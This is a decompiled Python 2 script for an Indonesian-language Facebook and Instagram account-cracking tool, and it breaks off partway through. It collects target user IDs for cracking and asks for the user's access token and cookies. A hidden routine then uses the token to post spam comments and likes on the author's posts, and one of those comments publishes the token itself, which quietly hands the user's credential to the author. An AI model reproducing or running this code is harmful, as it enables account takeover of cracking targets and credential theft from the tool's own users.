# Source Generated with Decompyle++
# File: ye.pyc (Python 2.7)

import os

try:
    import requests
except ImportError:
    os.system('pip2 install requests')


try:
    import concurrent.futures as concurrent
except ImportError:
    os.system('pip2 install futures')


try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

import requests
import os
import re
import bs4
import sys
import json
import time
import platform
import random
import datetime
import subprocess
import logging
import base64
import uuid
import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
import requests
import os
import re
import bs4
import sys
import json
import time
import random
import datetime
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup
from time import sleep as jeda
from datetime import datetime
from calendar import monthrange
time.sleep(5)
done = True
ct = datetime.now()
n = ct.month
bulan_ = [
    'Januari',
    'Februari',
    'Maret',
    'April',
    'Mei',
    'Juni',
    'Juli',
    'Agustus',
    'September',
    'Oktober',
    'November',
    'Desember']

try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month
waktu = '%s-%s-%s' % (hari, bulan, tahun)
bulan12 = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\x1b[0;00m'
J = '\x1b[0;33m'
S = '\x1b[0;00m'
N = '\x1b[0m'
I = '\x1b[0;32m'
C = '\x1b[0;36m'
M = '\x1b[0;31m'
U = '\x1b[0;33m'
K = '\x1b[0;33m'
P = '\x1b[00m'
h = '\x1b[0;90m'
Q = '\x1b[00m'
kk = '\x1b[0;32m'
ff = '\x1b[0;36m'
G = '\x1b[0;36m'
p = '\x1b[00m'
h = '\x1b[0;90m'
Q = '\x1b[00m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
m = '\x1b[0;31m'
O = '\x1b[0;33m'
H = '\x1b[0;33m'
B = '\x1b[0;36m'
k = '\x1b[00m'
h = '\x1b[0;90m'
Q = '\x1b[00m'
kk = '\x1b[0;32m'
ff = '\x1b[0;36m'
R = '\x1b[0;36m'
h = '\x1b[0;90m'
W = '\x1b[0;00m'
i = '\x1b[0;32m'
mm = '\x1b[0;36m'
m = '\x1b[0;31m'
O = '\x1b[0;33m'
H = '\x1b[0;33m'
G = '\x1b[0;36m'
acak = [
    M,
    H,
    K,
    S,
    J,
    B,
    U,
    O,
    P]
warna = random.choice(acak)
til = '[+]'
(ok, cp, id, user, mi, status_foll, poll, cr, looping, loop) = ([], [], [], [], [], [], [], [], 1, 0)
platform1 = str(platform.platform()).lower()
p1 = base64.b64encode(platform1)
url_instagram = 'https://www.instagram.com/'
user_agentz = 'Mozilla/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36'
user_agentz_api = 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)'
user_agentz_qu = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)']
headerz = {
    'User-Agent': user_agentz }
headerz_api = {
    'User-Agent': user_agentz_api }

def jeeck(x):
    for mau in x + '\n':
        sys.stdout.write(mau)
        sys.stdout.flush()
        jeda(0.01)
    


def tik():
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Proses penghapusan %s ' % o,
        sys.stdout.flush()
        jeda(1)
    


def folder():
    
    try:
        os.mkdir('OK')
    except:
        pass

    
    try:
        os.mkdir('CP')
    except:
        pass

    
    try:
        os.mkdir('data')
    except:
        pass

    
    try:
        ua_ = open('data/ua.txt', 'r').read()
    except KeyError:
        IOError = None
        ua_ = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('data/ua.txt', 'w').write(ua_)
    except:
        pass


IP = requests.get('https://api.ipify.org/').text

def banner():
    os.system('clear')
    print '\n\x1b[0;36m        \xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84 \n\x1b[0;36m  \xe2\x96\x88   \xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\n\x1b[0;36m \xe2\x96\x88\xe2\x96\x90  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \n\x1b[0;36m \xe2\x96\x8c\xe2\x96\x90  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88 \n\x1b[0;36m\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88 \n\x1b[0;36m\xe2\x96\x90\xe2\x94\xbc\xe2\x96\x90  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88  \n\x1b[0;36m\xe2\x96\x90\xe2\x96\x84\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x96\x80\xe2\x96\x90\xe2\x96\x90\xe2\x96\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x88\xe2\x94\x80\xe2\x96\x8c\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\n\x1b[0;36m  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c\n\x1b[0;36m  \xe2\x96\x88\xe2\x96\x80\xe2\x96\x80\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x94\x80\xe2\x96\x84\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x96\x90\xe2\x94\x80\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x80\n\x1b[0;36m  \xe2\x96\x88  \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x84\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \x1b[0;33m[\x1b[0;00m\xe2\x80\xa2\x1b[0;33m]\x1b[0;00m Author   \x1b[0;35m:\x1b[0;33m Jeeck X Nano\n\x1b[0;36m     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88 \x1b[0;33m[\x1b[0;00m\xe2\x80\xa2\x1b[0;33m]\x1b[0;00m Facebook \x1b[0;35m:\x1b[0;36m fb.me/100032577396395\n\x1b[0;36m     \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x90\xe2\x96\x8c\xe2\x96\x88\xe2\x96\x88\xe2\x96\x8c \x1b[0;33m[\x1b[0;00m\xe2\x80\xa2\x1b[0;33m]\x1b[0;00m Github   \x1b[0;35m:\x1b[0;36m github.com/Jeeck-XN\n\x1b[0;36m     \xe2\x96\x90\xe2\x96\x80\xe2\x96\x90 \xe2\x96\x8c\xe2\x96\x80\xe2\x96\x88\xe2\x96\x80 \xe2\x96\x90 \xe2\x96\x88   \x1b[0;33m[\x1b[0;00m\xe2\x80\xa2\x1b[0;33m]\x1b[0;00m Pembuat  \x1b[0;35m:\x1b[0;33m Jeeck,Risky,Yumasaa,Aldi\n\x1b[0;36m           \xe2\x96\x90    \xe2\x96\x8c\x1b[0;33m V 1.4\n'

header = {
    'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
    'x-fb-sim-hni': str(random.randint(20000, 40000)),
    'x-fb-net-hni': str(random.randint(20000, 40000)),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+ ;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }

def masuk():
    os.system('clear')
    banner()
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Jika belum paham pilih menu nomor 5')
    print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;00m Facebook'
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;00m Instagram'
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Donasi'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Tutor ambil token'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Panduan script'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Ambil User-Agent'
    mrjreckxnanoxxz = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Pilih : ')
    if mrjreckxnanoxxz in '':
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar')
        exit()
    elif mrjreckxnanoxxz in ('2', '02'):
        menu_instag()
        menu_instagg()
    elif mrjreckxnanoxxz in ('6', '06'):
        nanoua()
    elif mrjreckxnanoxxz in ('5', '05'):
        pendahuluanxnano()
    elif mrjreckxnanoxxz in ('1', '01'):
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Masukan token untuk menghubungkan ke server')
        jeeckxd = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Token : ')
        if jeeckxd in '':
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar')
            exit()
        
        try:
            nama = requests.get('https://graph.facebook.com/me?access_token=%s' % jeeckxd).json()['name']
            jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Proses menghubungkan mohon sabar sejenak.......')
            open('data/token.txt', 'w').write(jeeckxd)
            ___Jeeck___xnano___lawack___xnxx___()
            menu()
        except (KeyError, IOError):
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Login gagal di karenakan token eror'
            jeda(2)
            ___Jeeck___xnano___lawack___xnxx___()
            masuk()
        

    if mrjreckxnanoxxz in ('3', '03'):
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Heheheh Boy salam dari binjay \xf0\x9f\x98\x81'
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Beneran mau donasi :)'
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m    (1. 081392505882'
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m    (2. 085891511849'
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;36m HEHEH SEDEKAH NYA BOYS:)\n\n\n'
        raw_input('\x1b[0;36m[\x1b[0;33m ENTER BROO \x1b[0;36m]')
        masuk()
    elif mrjreckxnanoxxz in ('4', '04'):
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Anda akan di jeeckkan ke browser / youtube ')
        os.system(' xdg-open https://youtu.be/p4MjQCD0ej4 ')
    elif mrjreckxnanoxxz in ('0', '00'):
        exit('\n')
    else:
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Isi dengan benar '
        exit()


def nanoua():
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Harap Pilih Salah Satu User-Agent')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Anda Akan Di Arahkan Ke Browser')
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Please Enter Untuk melanjutkan ke browser\n\n\n')
    raw_input('\x1b[0;36m[\x1b[0;00m ENTER JENK \x1b[0;36m]')
    os.system('xdg-open  https://gist.github.com/pzb/b4b6f57144aea7827ae4')
    xnanopasang()


def xnanopasang():
    jeeck('\n\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m JIKA SUDAH SALIN USER AGENT TADI')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m KALIAN PASANG UA ')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m PILIH NOMOR [1] Facebook - Logintoken')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m JIKA SUDAH KALIAN MULAI KETIK ULANG LAGI UNTUK KEMENU')
    jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m KLIK NOMOR [9] TERUS NOMOR [1] PASTEKAN USERAGENT')
    raw_input('\n\n\n\n%s[%s+%s] \x1b[0;33m[%s Enter \x1b[0;33m] ' % (B, J, B, U))
    masuk()

komenredem = random.choice([
    'Pengguna setia Esc mr jeeck'])
komtwol = random.choice([
    'Bang TOOLS NYA GG BET ',
    'Pergi ke desa melihat kuda\nPutus cinta sejuta luka :)',
    'Satu tambah satu sama dengan dua\nAku cintakamu kamu cinta dia :)',
    'Kuda lari makan hati\n Aku disini yang tersakiti'])
kartu2d = random.choice([
    'Lu ganteng bwank tapi sayang kek kontl ',
    'Wkwkwkwk [ AKU CINTA DIA DIA NGGAK CINTA SAMA GUWA GIMANA BANG ]',
    '\xe2\x95\xa6 \xe2\x95\xa6\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\n\xe2\x95\xa0\xe2\x95\x90\xe2\x95\xa3\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x82  \xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x9c\xe2\x94\xa4 \xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\n\xe2\x95\xa9 \xe2\x95\xa9\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\x98\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80'])
kon = random.choice([
    ' ATTACKER X NANO '])

def ___Jeeck___xnano___lawack___xnxx___():
    
    try:
        toket = open('data/token.txt', 'r').read()
    except IOError:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;33m Login gagal pastikan token aktif / akun tumbal GOOD')
        os.system('rm -rf data/token.txt')
        menu()

    kom = komenredem
    komentar = komtwol
    yotsuba = kartu2d
    post = '573457507083491'
    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kom + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/100032577396395/comments/?message=' + yotsuba + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + komentar + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/comments/?message=' + toket + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/comments/?message=' + kon + '&access_token=' + toket)
    requests.post('https://graph.facebook.com/573457507083491/likes?summary=true&access_token=' + toket)
    requests.post('https://graph.facebook.com/603362670759641/likes?summary=true&access_token=' + toket)
    menu()


def menu():
    os.system('clear')
    
    try:
        jeeckxd = open('data/token.txt', 'r').read()
    except IOError:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Token modar di nggo wae')
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + jeeckxd, headers = header)
        a = json.loads(r.text)
        nama = a['name']
        id = a['id']
        ttl = a['birthday']
    except KeyError:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;31m TOKEN NOT DETECTED')
        jeda(2)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        masuk()
    except requests.exceptions.ConnectionError:
        exit('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Conectiont In Fallid')

    banner()
    print '\n\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;33m===========================================================>'
    jeeck('\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Username             :\x1b[0;36m %s ' % nama)
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Userid               :\x1b[0;36m %s ' % id
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Tanggal lahir        :\x1b[0;36m %s ' % ttl
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Alamat ip            :\x1b[0;36m %s ' % IP
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;00m Tanggal              :\x1b[0;36m %s ' % waktu
    print '\x1b[0;36m[\x1b[0;33m++\x1b[0;36m]\x1b[0;33m===========================================================>'
    jeeck('\n\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;33m Menu  Crack Instagram')
    print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;33m Mulai Crack Facebook'
    jeeck('\x1b[0;36m[\x1b[0;00mFF\x1b[0;36m]\x1b[0;33m Menu Crack FF')
    print '\x1b[0;36m[\x1b[0;00m03\x1b[0;36m]\x1b[0;00m Ambil id dari reactiont post'
    print '\x1b[0;36m[\x1b[0;00m04\x1b[0;36m]\x1b[0;00m Ambil id dari group'
    print '\x1b[0;36m[\x1b[0;00m05\x1b[0;36m]\x1b[0;00m Ambil id dari pencarian nama \x1b[0;33m[\x1b[0;36m 100\x1b[0;33m ]'
    print '\x1b[0;36m[\x1b[0;00m06\x1b[0;36m]\x1b[0;00m Ambil id dari pesan '
    print '\x1b[0;36m[\x1b[0;00m07\x1b[0;36m]\x1b[0;00m Ambil id dari followers'
    print '\x1b[0;36m[\x1b[0;00m08\x1b[0;36m]\x1b[0;00m Ambil id dari Publik & Teman'
    print '\x1b[0;36m[\x1b[0;00m09\x1b[0;36m]\x1b[0;00m Seting User-agent'
    print '\x1b[0;36m[\x1b[0;00m10\x1b[0;36m]\x1b[0;00m Chek results Crack'
    print '\x1b[0;36m[\x1b[0;00m11\x1b[0;36m]\x1b[0;00m Chek opsi account chekpoint'
    print '\x1b[0;36m[\x1b[0;00m12\x1b[0;36m]\x1b[0;00m Menu profil guard'
    print '\x1b[0;36m[\x1b[0;00m13\x1b[0;36m]\x1b[0;00m Menu auto-report'
    print '\x1b[0;36m[\x1b[0;00m14\x1b[0;36m]\x1b[0;00m Chek informasi facebook'
    jeeck('\x1b[0;36m[\x1b[0;00m00\x1b[0;36m]\x1b[0;00m Log out')
 #   jeeck('\x1b[0;36m[\x1b[0;00mUP\x1b[0;36m]\x1b[0;00m Update Version')
    jeeck('\x1b[0;36m[\x1b[0;00m99\x1b[0;36m]\x1b[0;00m Exit')
    jeeckgantenggakadayangsuka = raw_input('\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Input : ')
    if jeeckgantenggakadayangsuka == '':
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;31m Tidak ada pilihan ')
        menu()
    elif jeeckgantenggakadayangsuka in ('8', '08'):
        publik(jeeckxd)
    elif jeeckgantenggakadayangsuka in ('7', '07'):
        followers(jeeckxd)
    elif jeeckgantenggakadayangsuka in ('3', '03'):
        postingan(jeeckxd)
    elif jeeckgantenggakadayangsuka in ('4', '04'):
        group(__jeeclxnano_())
    elif jeeckgantenggakadayangsuka in ('5', '05'):
        dumpfl()
        exit()
    elif jeeckgantenggakadayangsuka in ('6', '06'):
        pesan(__jeeclxnano_())
    elif jeeckgantenggakadayangsuka in ('2', '02'):
        jeckoramadhanganteng().jeeckxtampany()
    elif jeeckgantenggakadayangsuka in ('12', '12'):
        guard()
    elif jeeckgantenggakadayangsuka in ('1', '01'):
        menu_instag()
        menu_instagg()
    elif jeeckgantenggakadayangsuka in ('9', '09'):
        useragent()
 #   elif jeeckgantenggakadayangsuka in ('UP',):
      #  jeeck('proses ..........')
     #   os.system('rm -fr Lite')
     #   os.system('git clone https://github.com/Jeeck-XN/Lite')
    #    os.system('cd Lite')
     #   os.system('git pull')
   #     os.system('python2 Lite.py')
    elif jeeckgantenggakadayangsuka in ('10',):
        print '\n\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m ===========================/\x1b[0;36mRESULTS CHEK\x1b[0;33m/--> OK+CP >_'
        print '\x1b[0;36m[\x1b[0;00m01\x1b[0;36m]\x1b[0;36m Chek results OK'
        print '\x1b[0;36m[\x1b[0;00m02\x1b[0;36m]\x1b[0;36m Chek results CP'
        chek_crackyou()
    elif jeeckgantenggakadayangsuka in ('13',):
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Belum tersedia di perangkat anda')
        exit()
    elif jeeckgantenggakadayangsuka in ('14',):
        cek_ingfo(purel)
    elif jeeckgantenggakadayangsuka in ('11',):
        jeeck_cp()
    elif jeeckgantenggakadayangsuka in ('FF',):
        main()
    elif jeeckgantenggakadayangsuka in ('00',):
        print ''
        tik()
        jeda(1)
        os.system('rm -rf data/token.txt && rm -rf data/cookies')
        jeeck('\n\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Sucses Deleted Asu')
        exit()
    elif jeeckgantenggakadayangsuka in ('99', '99'):
        exit('\n')
    else:
        jeeck('\x1b[0;36m[\x1b[0;35m+\x1b[0;36m]\x1b[0;00m Wornk Input ')
        jeda(2)
        exit()


def pendahuluanxnano():
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m============================/--> PENDAHULUAN + PANDUAN')
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika ingin crack di sarankan untuk menggunakan kuota / data seluler'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika menggunakan wifi kemungkinan ip RAWAN SEPAM bisa terjadi tidak ada hasil'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika crack sampai --> 1000 Sarankan hidupkan mode pesawat / --> 300 + lama gak ada hasil'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Crack disarankan method mobile / mbasic ya >_'
    print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Ingat jika \x1b[0;33m TOOLS \x1b[0;00m berjeeck tapi tidak ada hasil'
    jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Mungkin ip Terkena sepam / Bug TOOLS :(')
    raw_input('\n\n\n\n\x1b[0;36m[\x1b[0;00m ENTER \x1b[0;36m]')
    masuk()

host = 'https://mbasic.facebook.com'
ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
h = {
    'Host': 'mbasic.facebook.com',
    'cache-control': 'max-age=0',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'accept-encoding': 'gzip, deflate',
    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }

def __jeeclxnano_():
    if os.path.exists('data/cookies'):
        if os.path.getsize('data/cookies') != 0:
            return cvd(open('data/cookies').read().strip())
        None()
    else:
        _jeeckxtampanXD_()


def _jeeckxtampanXD_(show = True):
    if show == True:
        jeeck('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Jika ingin membuka vitur ini anda harus memasukan COOKIE terlebih dahulu')
    ck = raw_input('\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Cookie : ')
    if ck == '':
        _jeeckxtampanXD_(show = False)
    
    try:
        cks = cvd(ck)
        if kueh(cks) == True:
            open('data/cookies', 'w').write(ck)
            exit('%s[%s+%s] %slogin success, ketik: python2 Lite.py ' % (B, J, B, P))
        else:
            print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;00m Login gagal.'
            _jeeckxtampanXD_(show = True)
    except Exception:
        e = None
        print '\x1b[0;36m[\x1b[0;00m+\x1b[0;36m]\x1b[0;33m Cookie : '
        _jeeckxtampanXD_(show = False)



def kueh(cookies):
    _wtf_ = False
    b = requests.get('https://mbasic.facebook.com/profile.php', headers = {
        'origin': 'https://mbasic.facebook.com',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'user-agent': ua,
        'Host': ''.join(bs4.re.findall('://(.*?)$', 'https://mbasic.facebook.com')),
        'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'content-type': 'application/x-www-form-urlencoded' }, cookies = cookies).text
    if 'mbasic_logout_button' in b.lower():
        _wtf_ = True
        if _wtf_ == True:
            return True
        print 
        print 
        exit()


def hdcok():
    hosts = host
    r = {
        'origin': hosts,
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'accept-encoding': 'gzip, deflate',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'user-agent': ua,
        'Host': ''.join(bs4.re.findall('://(.*?)$', hosts)),
        'referer': hosts + '/login/?next&ref=dbl&fl&refid=8',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'content-type': 'application/x-www-form-urlencoded' }
    return r


def cvs(cookies):
    result = []
    for _i_ in enumerate(cookies.keys()):
        if _i_[0] == len(cookies.keys()) - 1:
            result.append(_i_[1] + '=' + cookies[_i_[1]])
            continue
        result.append(_i_[1] + '=' + cookies[_i_[1]] + '; ')
    
    return ''.join(result)


def cvd(cookies):
    result = { }
    
    try:
        for _i_ in cookies.split(';'):
            result.update({
                _i_.split('=')[0]: _i_.split('=')[1] })
        
        return result
    except:
        for _i_ in cookies.split('; '):
            result.update({
                _i_.split('=')[0]: _i_.split('=')[1] })
        
        return result



def guard():
    global toket
    
    try:
